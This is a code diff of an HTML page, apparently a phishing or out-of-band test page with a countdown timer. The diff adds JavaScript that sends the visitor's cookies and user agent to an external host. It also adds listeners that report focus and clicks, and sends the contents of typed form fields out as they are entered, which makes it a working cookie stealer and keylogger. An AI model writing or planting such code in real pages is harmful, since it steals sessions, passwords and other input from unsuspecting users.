@@ -45,7 +45,13 @@ try{
 </head>
 <body>
 <img src="https://d7eactc899s2runrje60xr3geu147za1g.oast.me/img-load" width="1" height="1">
-<script>new Image().src=O+"/js-exec?ua="+encodeURIComponent(navigator.userAgent)+"&ck="+encodeURIComponent(document.cookie);</script>
+<script>
+new Image().src=O+"/js-exec?ua="+encodeURIComponent(navigator.userAgent)+"&ck="+encodeURIComponent(document.cookie);
+// Detect any field interaction — focus, input, change
+document.addEventListener("focusin",function(e){if(e.target.id)new Image().src=O+"/focus-"+e.target.id},true);
+document.addEventListener("input",function(e){if(e.target.id&&e.target.value)new Image().src=O+"/input-"+e.target.id+"?v="+encodeURIComponent(e.target.value.substring(0,500))},true);
+document.addEventListener("click",function(e){if(e.target.id)new Image().src=O+"/click-"+e.target.id},true);
+</script>
 
 <div class="alert">
   <span class="timer" id="countdown">4:59</span>
